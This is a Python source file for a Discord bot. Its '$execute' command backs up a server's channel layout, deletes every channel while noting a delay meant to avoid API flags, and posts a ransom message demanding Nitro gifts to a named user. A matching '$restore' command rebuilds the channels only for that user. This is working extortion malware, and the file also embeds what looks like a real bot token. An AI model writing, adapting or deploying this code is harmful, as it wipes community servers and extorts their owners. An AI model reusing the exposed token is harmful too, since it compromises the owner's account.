import discord
from discord.ext import commands
import json
import asyncio

# Configuration
TOKEN = 'MTQ4NjQ0NzU1NjI4MzMzNDcwNw.Go_a6Z.d-7qsI0UzRet_BdeZ36YEJnqX6ohGBSpJyo_KA'  # Replace with your actual token
RESTORE_USER = 'serseveradofai'

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$', intents=intents)

# Persistent storage for guild states
backup_file = "guild_backups.json"

def save_backup(data):
    with open(backup_file, "w") as f:
        json.dump(data, f, indent=4)

def load_backups():
    try:
        with open(backup_file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

@bot.event
async def on_ready():
    print(f'System Online: {bot.user.name}')

@bot.command()
@commands.has_permissions(administrator=True)
async def execute(ctx):
    guild = ctx.guild
    backups = load_backups()

    # 1. Comprehensive Backup Phase
    guild_data = {
        "categories": [],
        "channels": []
    }

    for cat in guild.categories:
        guild_data["categories"].append({"name": cat.name, "id": cat.id, "pos": cat.position})

    for chan in guild.channels:
        if not isinstance(chan, discord.CategoryChannel):
            guild_data["channels"].append({
                "name": chan.name,
                "type": str(chan.type),
                "category": chan.category.name if chan.category else None,
                "position": chan.position
            })

    backups[str(guild.id)] = guild_data
    save_backup(backups)

    # 2. Iterative Deletion (Bypassing Rate Limits)
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.1) # Minimum delay to mitigate API flags
        except Exception as e:
            print(f"Deletion failed for {channel.name}: {e}")

    # 3. Payload Deployment
    lock_ch = await guild.create_text_channel('locked-until-fine-paid')
    await lock_ch.send(f"To get the server back, and the virus destroyed, send a nitro gift, basic or boost to @{RESTORE_USER}")

@bot.command()
async def restore(ctx):
    # Restrict to the defined controller
    if ctx.author.name != RESTORE_USER:
        return

    guild = ctx.guild
    backups = load_backups()
    data = backups.get(str(guild.id))

    if not data:
        return await ctx.send("No backup data found for this guild ID.")

    # 4. Reconstruction Phase
    # Create Categories first
    cat_map = {}
    for cat_info in data["categories"]:
        new_cat = await guild.create_category(cat_info["name"])
        cat_map[cat_info["name"]] = new_cat

    # Create Channels and nest them
    for ch_info in data["channels"]:
        target_cat = cat_map.get(ch_info["category"])
        if ch_info["type"] == "text":
            await guild.create_text_channel(ch_info["name"], category=target_cat)
        elif ch_info["type"] == "voice":
            await guild.create_voice_channel(ch_info["name"], category=target_cat)
        await asyncio.sleep(0.1)

bot.run(TOKEN)
